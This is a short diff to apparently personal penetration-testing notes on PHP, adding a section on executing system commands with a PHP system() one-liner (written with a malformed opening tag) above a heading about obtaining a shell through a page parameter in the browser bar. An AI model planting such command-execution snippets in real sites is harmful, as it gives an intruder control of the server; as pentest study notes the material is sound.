@@ -1,5 +1,9 @@
 # PHP Penteration Testing Techniques
 
+### Execute system commands using php
+`<php system('ls -la'); ?>`
+
+---
 ### Obtaining Shell through Browser Bar
 ```
 # If you get similar to ?page=index in the browser bar
